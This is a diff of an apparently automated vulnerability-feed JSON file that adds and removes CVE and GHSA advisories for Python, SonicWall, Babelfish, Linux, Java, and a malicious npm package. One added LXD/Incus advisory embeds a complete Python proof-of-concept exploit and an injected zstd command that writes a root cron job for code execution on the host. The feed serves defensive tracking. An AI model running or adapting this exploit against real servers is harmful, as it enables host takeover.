@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-11-06T18:30:11.338782+00:00",
+  "generated_at": "2026-11-06T23:31:58.291375+00:00",
   "items": [
     {
       "id": "CVE-2026-109618",
@@ -29455,55 +29455,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-119170",
-      "aliases": [],
-      "title": "Regression in FIPS enforcement of hash algorithms affecting only Python 3.14.10",
-      "description": "There was a regression in how FIPS algorithms were enforced for the hashlib module. Only users that are using OpenSSL in FIPS mode are affected. Only Python 3.14.10 is affected, all other Python versions are unaffected.",
-      "published": "2026-11-06T14:50:11.952Z",
-      "updated": "2026-11-06T18:17:57.750",
-      "cvss": 8.2,
-      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "Python Software Foundation CPython"
-      ],
-      "references": [
-        "https://github.com/python/cpython/issues/160923",
-        "https://mail.python.org/archives/list/security-announce@python.org/thread/PXVTTOBPUMFJSSUXN6XCS7FC5DZOSZXK/",
-        "https://github.com/python/cpython/pull/160984"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "none",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-06T18:30:11.338782+00:00",
-      "matched": [
-        "python"
-      ],
-      "match_type": "exact",
-      "tier": 1,
-      "score": 51.4,
-      "level": "high",
-      "score_breakdown": {
-        "popularity": 30,
-        "cvss": 16.4,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-105005",
       "aliases": [],
       "title": "",
@@ -32387,6 +32338,56 @@
         "cvss": 15.0,
         "rce": 5,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-19868",
+      "aliases": [],
+      "title": "SonicWall SonicOS SSLVPN Use of Single-factor Authentication Vulnerability",
+      "description": "An authentication enforcement vulnerability in SonicOS SSLVPN service may allow a user with valid credentials for an alternate authentication method to bypass SAML authentication controls. Successful exploitation may also bypass SAML-enforced multi-factor authentication (MFA).",
+      "published": "2026-11-06T19:03:00.616Z",
+      "updated": "2026-11-06T21:17:08.737",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "SonicWall SonicOS",
+        "SonicWall SonicOS SSLVPN"
+      ],
+      "references": [
+        "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0014",
+        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-19868",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-19868"
+      ],
+      "exploit_ref": false,
+      "kev": true,
+      "kev_date_added": "2026-11-06",
+      "ransomware": false,
+      "ssvc_exploitation": "active",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd",
+        "kev"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [],
+      "match_type": "kev-only",
+      "tier": null,
+      "score": 50.0,
+      "level": "high",
+      "score_breakdown": {
+        "popularity": 10,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "kev": 20
       },
       "ai_analysis": ""
     },
@@ -46724,7 +46725,7 @@
       "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nipv4: free inet_opt and ireq_opt after an RCU grace period\n\ntcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the\nchild socket (newinet->inet_opt) without copying it.\n\nAnother cpu can concurrently process a retransmitted SYN for the same\nrequest socket, and send a SYNACK from tcp_check_req().\ntcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt\nunder rcu_read_lock() only, and ip_build_and_send_pkt() and\nip_options_build() then read opt->optlen twice.\n\nNote that the SYNACK timer itself is not an issue: it holds a\nreference on its request socket, and inet_csk_reqsk_queue_drop()\ncalls timer_delete_sync() before the child can be freed.\n\nSince commit 079096f103fa (\"tcp/dccp: install syn_recv requests\ninto ehash table\"), request sockets are processed without holding\nthe listener lock, so nothing prevents the child socket from being\nfreed while the SYNACK is still being built. TCP child sockets do\nnot have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt\nwith a plain kfree(), leading to a use-after-free in\nip_options_build().\n\nA similar issue exists with request socket migration\n(net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE\nprogram). reqsk_timer_handler() clones the request socket with\ninet_reqsk_clone(), so that the old request socket and its clone\nshare the same ireq_opt, then reqsk_migrate_reset() clears the\npointer in the old one. Another cpu holding a reference on the old\nrequest socket can still be using these options (sending a SYNACK,\nor creating a child in tcp_v4_syn_recv_sock()) when the clone is\nfreed, and tcp_v4_reqsk_destructor() also uses a plain kfree().\n\nReaders already use RCU, and other paths replacing inet_opt\n(do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use\nkfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and\ntcp_v4_reqsk_destructor() as well.\n\nIPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock()\nduplicates the options. tcp_v6_reqsk_destructor() has the same\nmigration issue with ipv6_opt, which is only set by CALIPSO. This\nwill be addressed in a separate patch.",
       "published": "2026-10-15T13:17:13.987",
-      "updated": "2026-11-03T07:20:59.297",
+      "updated": "2026-11-06T19:28:12.867",
       "cvss": 9.8,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
       "severity": "critical",
@@ -46749,7 +46750,7 @@
       "ransomware": false,
       "ssvc_exploitation": "",
       "epss": 0.0076,
-      "epss_percentile": 0.55326,
+      "epss_percentile": 0.55457,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -61084,6 +61085,57 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-119923",
+      "aliases": [],
+      "title": "Heap-based Buffer Overflow in Babelfish for PostgreSQL TDS Prelogin Parser",
+      "description": "A heap-based buffer overflow in the TDS prelogin parser in the Babelfish for PostgreSQL extension versions 1.0-1.5, 2.1-2.15, 3.1-3.12, 4.0-4.8, 5.1-5.4 and in Amazon Aurora PostgreSQL with Babelfish might allow remote attackers to execute arbitrary OS commands as the database process user via a specially crafted malformed TDS prelogin packet to the TDS port. This record consolidates a related NULL-pointer-dereference finding in the same prelogin parser.\n\n\n\nTo remediate this issue, we recommend users upgrade to Babelfish for PostgreSQL extension versions 4.10, 5.6, 6.1 or later. As a workaround, restrict network access to the TDS port (default 1433). Customers using Amazon Aurora PostgreSQL with Babelfish should upgrade their cluster to Aurora PostgreSQL 13.9.16 (1.5.5), 13.23.3 (1.17.2), 14.6.16 (2.3.5), 14.17.8 (2.12.4), 14.18.6 (2.13.3), 14.19.5 (2.14.2), 14.20.5 (2.15.2), 14.22.3 (2.16.1), 14.23.1 (2.17.0), 15.10.8 (3.8.4), 15.12.8 (3.9.4), 15.13.6 (3.10.3), 15.14.5 (3.11.2), 15.15.5 (3.12.2), 15.17.3 (3.13.1), 15.18.1 (3.14.0), 16.8.8 (4.5.5), 16.9.6 (4.6.3), 16.10.5 (4.7.2), 16.11.5 (4.8.2), 16.13.3 (4.9.1), 16.14.1 (4.10.0), 17.4.8 (5.1.4), 17.5.6 (5.2.3), 17.6.5 (5.3.2), 17.7.5 (5.4.2), 17.9.3 (5.5.1), 17.10.1 (5.6.0), 18.3.4 (6.0.2), 18.4.1 (6.1.0) or later, and apply any pending maintenance to ensure they are on the latest patch.",
+      "published": "2026-11-06T18:35:49.413Z",
+      "updated": "2026-11-06T21:17:06.347",
+      "cvss": 9.3,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+      "severity": "critical",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "AWS babelfish-for-postgresql",
+        "Amazon Amazon Aurora PostgreSQL with Babelfish"
+      ],
+      "references": [
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_4_10_0__PG_16_14",
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_5_6_0__PG_17_10",
+        "https://github.com/babelfish-for-postgresql/babelfish-for-postgresql/releases/tag/BABEL_6_1_0__PG_18_4",
+        "https://aws.amazon.com/security/security-bulletins/2026-166-aws/"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "none",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "cve.org",
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "postgresql"
+      ],
+      "match_type": "exact",
+      "tier": 2,
+      "score": 43.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 20,
+        "cvss": 18.6,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-109413",
       "aliases": [
         "GHSA-2v3c-qxhr-7vpv"
@@ -63747,6 +63799,52 @@
         "cvss": 17.4,
         "unauth_network": 5,
         "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-119170",
+      "aliases": [],
+      "title": "",
+      "description": "There was a regression in how FIPS algorithms were enforced for the hashlib module. Only users that are using OpenSSL in FIPS mode are affected. Only Python 3.14.10 is affected, all other Python versions are unaffected.",
+      "published": "2026-11-06T15:17:12.073",
+      "updated": "2026-11-06T18:17:57.750",
+      "cvss": 8.2,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/python/cpython/issues/160923",
+        "https://github.com/python/cpython/pull/160984",
+        "https://mail.python.org/archives/list/security-announce@python.org/thread/PXVTTOBPUMFJSSUXN6XCS7FC5DZOSZXK/"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T18:30:11.338782+00:00",
+      "matched": [
+        "openssl"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 42.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 16.4,
+        "unauth_network": 5
       },
       "ai_analysis": ""
     },
@@ -72455,56 +72553,6 @@
       "ai_analysis": ""
     },
     {
-      "id": "CVE-2026-116472",
-      "aliases": [],
-      "title": "ingress-nginx mirror-target self-DOS",
-      "description": "A security issue was discovered in ingress-nginx where a user with permission to create an Ingress may be able to cause denial of service of the ingress-nginx data plane, or possibly redirect traffic from other Ingresses. Kubernetes clusters are only affected if they are using ingress-nginx.\n\nDue to a missing check, the mirror-target Ingress annotation can be used to target an unauthenticated configuration API within the ingress-nginx controller, allowing write commands to be submitted. Corrupting the data within that configuration API results in all traffic through ingress-nginx being dropped until an Ingress configuration change or a controller restart causes the data to be recreated correctly.\n\nIn principle, this write access could also be used to redirect traffic from other Ingresses controlled by the same ingress-nginx instance. In practice, there is negligible additional risk: such redirection would require privileged information about internal ingress-nginx state, and users can already redirect traffic from other Ingresses controlled by the same ingress-nginx anyway.",
-      "published": "2026-11-05T18:13:29.564Z",
-      "updated": "2026-11-05T22:17:48.357",
-      "cvss": 2.7,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:L",
-      "severity": "low",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "Kubernetes ingress-nginx",
-        "SUSE Rancher Prime RKE2 ingress-nginx"
-      ],
-      "references": [
-        "https://github.com/kubernetes/kubernetes/issues/143852",
-        "http://www.openwall.com/lists/oss-security/2026/11/05/4"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-05T23:38:48.927446+00:00",
-      "matched": [
-        "nginx",
-        "kubernetes"
-      ],
-      "match_type": "exact",
-      "tier": 1,
-      "score": 40.4,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 30,
-        "cvss": 5.4,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
       "id": "CVE-2026-98169",
       "aliases": [],
       "title": "",
@@ -78146,6 +78194,48 @@
       "ai_analysis": ""
     },
     {
+      "id": "GHSA-q8jp-gq6p-hwpx",
+      "aliases": [],
+      "title": "Malware in @cherrydotfun/miniapp-sdk",
+      "description": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n\n週間ダウンロード数: 約 1,422",
+      "published": "2026-11-06T22:15:57Z",
+      "updated": "2026-11-06T23:04:27Z",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [
+        "npm:@cherrydotfun/miniapp-sdk"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-q8jp-gq6p-hwpx"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa-malware"
+      ],
+      "category": "malware",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "npm:@cherrydotfun/miniapp-sdk"
+      ],
+      "match_type": "malware",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-109829",
       "aliases": [
         "GHSA-4w7w-5xrc-9h26"
@@ -78381,54 +78471,6 @@
       "first_seen": "2026-11-03T21:00:08.723666+00:00",
       "matched": [
         "docker"
-      ],
-      "match_type": "exact",
-      "tier": 2,
-      "score": 39.8,
-      "level": "medium",
-      "score_breakdown": {
-        "popularity": 20,
-        "cvss": 14.8,
-        "unauth_network": 5
-      },
-      "ai_analysis": ""
-    },
-    {
-      "id": "CVE-2026-116592",
-      "aliases": [],
-      "title": "undici vulnerable to cache poisoning and cross-user disclosure via intermediate redirect hops",
-      "description": "undici is an HTTP client for Node.js. In versions 7.30.1 and 8.12.2 through 8.12.3, when an originless Agent composes the redirect and shared cache interceptors, undici decides whether to store the final response under the original request key by inspecting only the final redirect hop, which bypasses the earlier fix for CVE-2026-109829 that compared only the initial and final origins. A redirect that bounces through an untrusted origin and returns to the trusted origin is still cached under the trusted key, an intermediate hop's Vary is dropped so a response that varies on Authorization or Cookie can be served to a different user, and an intermediate hop's no-cache or default-uncacheable status is ignored so a non-storable redirect is laundered into a cacheable entry. An attacker who controls a redirect target from a trusted URL can poison the cached entry for that URL or have a private, per-user response served to a later caller. The issue is fixed in undici 7.30.2 and 8.12.4, and users should upgrade to one of those versions or later. As a workaround, compose the interceptors as cache then redirect, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.",
-      "published": "2026-11-06T10:05:41.972Z",
-      "updated": "2026-11-06T10:16:36.313",
-      "cvss": 7.4,
-      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
-      "severity": "high",
-      "cpes": [],
-      "packages": [],
-      "vendor_products": [
-        "undici undici"
-      ],
-      "references": [
-        "https://github.com/nodejs/undici/security/advisories/GHSA-mqg3-3v4r-cm32",
-        "https://cna.openjsf.org/security-advisories.html"
-      ],
-      "exploit_ref": false,
-      "kev": false,
-      "kev_date_added": "",
-      "ransomware": false,
-      "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
-      "x_mentions": null,
-      "sources": [
-        "cve.org",
-        "nvd"
-      ],
-      "category": "vuln",
-      "resolved_at": "",
-      "first_seen": "2026-11-06T11:31:43.774082+00:00",
-      "matched": [
-        "undici"
       ],
       "match_type": "exact",
       "tier": 2,
@@ -80073,6 +80115,51 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-101516",
+      "aliases": [],
+      "title": "",
+      "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries).  Supported versions that are affected are Oracle Java SE: 8u503, 8u503-perf, 11.0.32.1, 17.0.20.1, 21.0.12.1, 25.0.4.1, 27; Oracle GraalVM for JDK: 17.0.20.1 and  21.0.12.1; Oracle GraalVM Enterprise Edition: 21.3.19.1.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 6.5 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N).",
+      "published": "2026-10-20T22:18:00.867",
+      "updated": "2026-11-06T20:17:05.440",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://www.oracle.com/security-alerts/cpuoct2026.html"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00281,
+      "epss_percentile": 0.20728,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "java"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 39.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-83926",
       "aliases": [],
       "title": "",
@@ -81027,6 +81114,57 @@
         "popularity": 14.0,
         "cvss": 19.8,
         "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "GHSA-fmc8-p6q7-75cc",
+      "aliases": [],
+      "title": "LXD has argument injection in backup compression algorithm leading to AFW and ACE",
+      "description": "Reported from  https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4\n\n### Summary\n\nImproper validation of user-provided backup compression algorithm leads to\nargument injection in the constructed command line. This leads to an\narbitrary file write on the host, possibly leading to arbitrary command\nexecution.\n\n\n### Details\n\nIncus validates `compression_algorithm` by parsing it into fields and checking\nonly the first token against an allowlist:\n\n```go\nfields, err := shellquote.Split(value)\n...\nif !slices.Contains([]string{\"bzip2\", \"gzip\", \"lz4\", \"lzma\", \"pigz\", \"pzstd\", \"pxz\", \"tar2sqfs\", \"xz\", \"zstd\"}, fields[0]) {\n    return fmt.Errorf(\"Compression algorithm %q isn't currently supported\", fields[0])\n}\n_, err = exec.LookPath(fields[0])\n```\n\nExtra arguments are not rejected. `compressFile()` then prepends `-c` and\npasses the remaining user-supplied fields to the compressor:\n\n```go\nargs := []string{\"-c\"}\nif len(fields) > 1 {\n    args = append(args, fields[1:]...)\n}\ncmd := exec.Command(fields[0], args...)\ncmd.Stdin = infile\ncmd.Stdout = outfile\n```\n\nWith a value like:\n\n```text\nzstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload\n```\n\nthe daemon executes the equivalent of:\n\n```text\nzstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload\n```\n\n### PoC\n\n```\npython3 poc.py \\\n\t--insecure --url https://remote-incus:8443 \\\n\t--cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \\\n\t--instance c01 \\\n\t--execute --yes-i-understand-this-writes-host-file\n```\n\nThe following was generated by an LLM model.\n\n```\n#!/usr/bin/env python3\n\"\"\"Short remote Incus backup compression zstd cron RCE PoC.\n\nDry-run is the default.  --execute uploads a cron payload into an instance and\nthen asks Incus for a direct backup with a zstd argument-injection compressor:\n\n    zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- <source>\n\nThe direct backup may fail after zstd runs; the host file write is the primitive.\nUse only on an authorized Incus server.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport os\nimport shlex\nimport sys\nimport urllib.parse\nfrom pathlib import PurePosixPath\nfrom typing import Any\n\nimport requests\n\n\ndef q(value: str) -> str:\n    return urllib.parse.quote(value, safe=\"\")\n\n\ndef api(base: str, endpoint: str, **params: str) -> str:\n    return base.rstrip(\"/\") + endpoint + (\"?\" + urllib.parse.urlencode(params) if params else \"\")\n\n\ndef project_instance(project: str, instance: str) -> str:\n    return instance if project == \"default\" else f\"{project}_{instance}\"\n\n\ndef clean_guest_path(path: str) -> str:\n    if not path.startswith(\"/\"):\n        raise ValueError(\"--guest-path must be absolute\")\n    if \"..\" in PurePosixPath(path).parts:\n        raise ValueError(\"--guest-path must not contain '..'\")\n    return os.path.normpath(\"/\" + path.lstrip(\"/\")).lstrip(\"/\")\n\n\ndef source_path(args: argparse.Namespace) -> str:\n    if args.source_host_path:\n        return args.source_host_path\n    return os.path.join(\n        args.incus_dir,\n        \"storage-pools\",\n        args.pool,\n        args.storage_kind,\n        project_instance(args.project, args.instance),\n        \"rootfs\",\n        clean_guest_path(args.guest_path),\n    )\n\n\ndef cron(command: str) -> bytes:\n    return f\"* * * * * root /bin/sh -c {shlex.quote(command)}\\n\".encode()\n\n\ndef session(args: argparse.Namespace) -> requests.Session:\n    s = requests.Session()\n    s.verify = False if args.insecure else (args.cacert or True)\n    if args.cert or args.key:\n        s.cert = (args.cert, args.key)\n    if args.token:\n        s.headers[\"Authorization\"] = \"Bearer \" + args.token\n    s.headers[\"User-Agent\"] = \"incus-zstd-backup-rce-poc\"\n    if args.insecure:\n        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]\n    return s\n\n\ndef check(resp: requests.Response, what: str) -> requests.Response:\n    if resp.status_code >= 400:\n        try:\n            detail: Any = resp.json()\n        except Exception:\n            detail = resp.text[:2048]\n        raise RuntimeError(f\"{what} failed: HTTP {resp.status_code}: {detail}\")\n    return resp\n\n\ndef upload(s: requests.Session, args: argparse.Namespace, payload: bytes) -> None:\n    url = api(args.url, f\"/1.0/instances/{q(args.instance)}/files\", project=args.project, path=args.guest_path)\n    headers = {\n        \"Content-Type\": \"application/octet-stream\",\n        \"X-Incus-type\": \"file\",\n        \"X-Incus-write\": \"overwrite\",\n        \"X-Incus-uid\": \"0\",\n        \"X-Incus-gid\": \"0\",\n        \"X-Incus-mode\": \"0644\",\n    }\n    print(f\"[*] uploading cron payload to {args.instance}:{args.guest_path}\")\n    check(s.post(url, data=payload, headers=headers, timeout=args.timeout), \"payload upload\")\n\n\ndef trigger_backup(s: requests.Session, args: argparse.Namespace, body: dict[str, Any]) -> None:\n    url = api(args.url, f\"/1.0/instances/{q(args.instance)}/backups\", project=args.project)\n    print(\"[*] sending direct backup request\")\n    resp = s.post(\n        url,\n        data=json.dumps(body).encode(),\n        headers={\"Accept\": \"application/octet-stream\", \"Content-Type\": \"application/json\"},\n        timeout=args.timeout,\n        stream=True,\n    )\n    print(f\"[*] backup HTTP {resp.status_code}\")\n    resp.close()\n    if resp.status_code >= 400:\n        print(\"[*] HTTP error after compressor launch is possible; check whether the cron file was written\")\n\n\ndef parse_args() -> argparse.Namespace:\n    p = argparse.ArgumentParser(description=\"Remote Incus zstd backup-compression cron RCE PoC\")\n    p.add_argument(\"--url\", required=True, help=\"https://host:8443\")\n    p.add_argument(\"--cert\", help=\"client certificate PEM\")\n    p.add_argument(\"--key\", help=\"client private key PEM\")\n    p.add_argument(\"--cacert\", help=\"CA certificate PEM\")\n    p.add_argument(\"--token\", help=\"bearer token\")\n    p.add_argument(\"--insecure\", action=\"store_true\", help=\"disable TLS verification\")\n    p.add_argument(\"--timeout\", type=int, default=180)\n\n    p.add_argument(\"--project\", default=\"default\")\n    p.add_argument(\"--instance\", required=True)\n    p.add_argument(\"--pool\", default=\"default\")\n    p.add_argument(\"--storage-kind\", choices=[\"containers\", \"virtual-machines\"], default=\"containers\")\n    p.add_argument(\"--incus-dir\", default=\"/var/lib/incus\")\n    p.add_argument(\"--guest-path\", default=\"/incus-zstd-cron\")\n    p.add_argument(\"--source-host-path\", help=\"override daemon-readable host path for the staged payload\")\n    p.add_argument(\"--cron-path\", default=\"/etc/cron.d/incus-zstd-rce\")\n    p.add_argument(\"--command\", default=\"date >/incus-zstd-rce; id >>/incus-zstd-rce\")\n\n    p.add_argument(\"--execute\", action=\"store_true\", help=\"stage payload and send backup request\")\n    p.add_argument(\"--yes-i-understand-this-writes-host-file\", action=\"store_true\", help=\"required with --execute\")\n    args = p.parse_args()\n\n    if urllib.parse.urlparse(args.url).scheme != \"https\":\n        p.error(\"--url must use https\")\n    if bool(args.cert) != bool(args.key):\n        p.error(\"--cert and --key must be supplied together\")\n    if args.execute and not args.yes_i_understand_this_writes_host_file:\n        p.error(\"--execute requires --yes-i-understand-this-writes-host-file\")\n    try:\n        clean_guest_path(args.guest_path)\n    except ValueError as exc:\n        p.error(str(exc))\n\n    args.url = args.url.rstrip(\"/\")\n    return args\n\n\ndef main() -> int:\n    args = parse_args()\n    src = source_path(args)\n    payload = cron(args.command)\n    compressor = f\"zstd -d -f --pass-through -o {shlex.quote(args.cron_path)} -- {shlex.quote(src)}\"\n    body = {\"compression_algorithm\": compressor, \"instance_only\": True}\n\n    print(\"[*] target:\", args.url)\n    print(\"[*] project:\", args.project)\n    print(\"[*] instance:\", args.instance)\n    print(\"[*] source host path:\", src)\n    print(\"[*] cron path:\", args.cron_path)\n    print(\"[*] payload:\", payload.decode().rstrip())\n    print(\"[*] backup body:\", json.dumps(body, sort_keys=True))\n\n    if not args.execute:\n        print(\"[*] dry run only; add --execute and the confirmation flag to act\")\n        return 0\n\n    s = session(args)\n    upload(s, args, payload)\n    trigger_backup(s, args, body)\n    return 0\n\n\nif __name__ == \"__main__\":\n    try:\n        raise SystemExit(main())\n    except BrokenPipeError:\n        raise SystemExit(1)\n    except Exception as exc:\n        print(f\"[-] {exc}\", file=sys.stderr)\n        raise SystemExit(1)\n```\n\n\n### Impact\n\nImproperly validated compression algorithm argument leads to argument\ninjection leading to arbitrary file write with `zstd` and possibly\narbitrary command execution.",
+      "published": "2026-11-06T19:36:37Z",
+      "updated": "2026-11-06T19:36:38Z",
+      "cvss": 9.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "severity": "critical",
+      "cpes": [],
+      "packages": [
+        "go:github.com/canonical/lxd"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-fmc8-p6q7-75cc",
+        "https://github.com/canonical/lxd/security/advisories/GHSA-fmc8-p6q7-75cc",
+        "https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-48755",
+        "https://github.com/canonical/lxd/commit/0915bb88cbb0baed5ac1aef8e62079c57ac877da",
+        "https://github.com/canonical/lxd/commit/0ab30d1bbe398ef6359fb8116d6852790a1f151d"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-11-06T23:31:58.291375+00:00",
+      "matched": [
+        "zstd"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 38.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 19.8,
+        "rce": 5
       },
       "ai_analysis": ""
     },
@@ -82519,6 +82657,61 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-112693",
+      "aliases": [],
+      "title": "",
